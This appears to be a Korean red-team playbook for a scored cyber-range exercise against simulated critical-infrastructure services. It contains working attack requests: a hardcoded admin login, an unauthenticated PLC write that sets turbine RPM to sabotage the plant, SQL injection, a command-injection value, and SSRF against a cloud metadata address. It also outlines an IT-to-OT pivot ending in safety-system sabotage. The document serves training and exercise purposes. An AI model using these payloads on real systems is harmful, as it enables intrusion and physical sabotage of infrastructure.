# 🔴 RED PLAYBOOK — 공격 방법론

레드팀은 **Red Portal(:5176)** 에서 팀을 선택하고 챌린지를 풉니다. 챌린지는 두 종류:
- **📦 분석형(artifact)**: 포털에서 아티팩트(로그/pcap/바이너리) 다운로드 → 분석 → 정답 필드 제출.
- **🎯 서비스형(service)**: 실제 취약 서비스(트윈/배포 컨테이너)를 직접 익스플로잇 → 플래그 추출.

> 플래그는 팀별 HMAC 동적이라 다른 팀 답을 복붙해도 안 됩니다. 반드시 자기 팀 데이터로 풀어야 합니다.

---
## 0. 정찰 (Recon)
```bash
HOST=100.64.140.27          # Tailscale IP (환경에 맞게)
# 트윈 헬스/엔드포인트 확인
for p in 8001 8002 8003 8201 8202 8203 8204 8205 8206 8207 8208; do
  echo "== :$p =="; curl -s http://$HOST:$p/health
done
```
트윈 포트: 위성 8001 · 발전소 8002 · 사내망 8003 · 정유 8201 · 스마트팩토리 8202 · 수도 8203 ·
LNG 8204 · 철도 8205 · 공항 8206 · 데이터센터 8207 · 병원 8208.

---
## 1. Web / 서비스형 트윈 공격 (실전 예시)

### 하드코딩 계정 → 관리자 토큰 (위성 GS-002)
```bash
curl -X POST http://$HOST:8001/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}'
# → {"token":"eyJ...admin JWT..."}   획득한 토큰으로 권한 상승
```

### 미인증 PLC 레지스터 쓰기 → 사보타주 (발전소 PP-001)
```bash
curl -X POST http://$HOST:8002/api/plc/write \
  -H 'Content-Type: application/json' \
  -d '{"register":"TURBINE_RPM","value":9999}'
# → 터빈 RPM 조작. Live Fire Process Impact에 "계통 주파수 붕괴"로 표시됨
```

### SQL 인젝션 (텔레메트리 GS-001)
```bash
curl "http://$HOST:8001/api/telemetry?sensor_id=SOL-PANEL-1' OR '1'='1"
```

### 명령 주입 (진단 PP-003)
```bash
curl -X POST http://$HOST:8002/api/diagnostics/ping \
  -H 'Content-Type: application/json' -d '{"host":"127.0.0.1; id"}'
```

### SSRF (TLE 임포트 GS-006 / DCIM DCX-003)
```bash
curl -X POST http://$HOST:8001/api/tle/import \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'   # 내부 메타데이터 노출
```

> 취약 서비스 60종 전체 목록·엔드포인트: `shared/vuln_catalog.json` 또는 README "트윈 취약 서비스".
> 각 취약점은 요청 성공 시 **자동으로 이벤트가 발생**해 Live Fire/블루팀이 관측합니다 → 은밀성도 점수 요소.

---
## 2. 분석형(트래픽/포렌식/리버싱) 공격

공통 흐름: **Red Portal에서 아티팩트 다운로드 → 분석 → 정답 필드 제출**.

### ICS 트래픽 분석 (예: ICS-010 EtherNet/IP CIP)
1. 포털에서 `⬇ 아티팩트 다운로드` → `enip_traffic.jsonl` 획득.
2. 정상 PLC(10.80.0.5)가 **아닌** 출발지에서 안전 어셈블리(class 4, instance 101)에
   `SetAttributeSingle(0x10) write` 한 프레임을 찾음 → 그 src가 **공격자 IP**.
3. 그 레코드의 `note`(base64)를 **공격자 IP로 XOR 복호** → `flag{...}`.
```python
import json,base64
rows=[json.loads(l) for l in open("enip_traffic.jsonl")]
r=next(x for x in rows if x["cip_service"]==16 and x["cip_class"]==4
       and x["cip_instance"]==101 and x["src"]!="10.80.0.5")
ip=r["src"]
flag=bytes(b^ip.encode()[i%len(ip)] for i,b in enumerate(base64.b64decode(r["note"]))).decode()
print(ip, flag)   # attacker_ip, flag → 포털에 제출
```
> 나머지 ICS-002~012, BACnet/FF/S7comm/MQTT 등 12개 프로토콜이 **동일 패턴**(무단 출발지 +
> 안전계통 조작 프레임 → src가 공격자 → note XOR). 판별 조건만 프로토콜별로 다릅니다(ANSWER-KEY 참조).

### 포렌식/리버싱
- **FOR**(포렌식): 커맨드 이력·이메일 헤더·메모리 덤프·안티포렌식 로그에서 유출/발신지/자격증명 복원.
- **NET**(네트워크): 평문 스니핑·비콘 주기성 등 pcap 분석.
- **REV**(리버싱): 인코딩된 바이너리·핸들러테이블 VM 분석으로 시리얼/플래그 도출.

---
## 3. 킬체인 (멀티 자산 크로스오버)
`scenarios/crossover/XOVER-IT-OT-PIVOT-01` 같은 시나리오는 **IT→OT 피벗**을 요구합니다:
사내망(8003) 발판 확보 → 자격증명 탈취 → 정유 OPC UA(8201) 정찰 → SIS 사보타주.
각 단계가 순서대로 이벤트로 잡혀야 chain bonus(+50)를 받습니다.

---
## Tips
- 서비스형은 `patched: false` 필드로 취약 여부를 알 수 있음(블루가 패치하면 401/403).
- 제출 필드는 챌린지마다 다름(`flag` / `attacker_ip`+`flag` / `attacker_addr`+`flag`) — 포털 폼이 안내.
- 오답도 무제한 재시도 가능. 정답 시 팀 점수·스코어보드 즉시 반영 + Live Fire에 목표달성 표시.
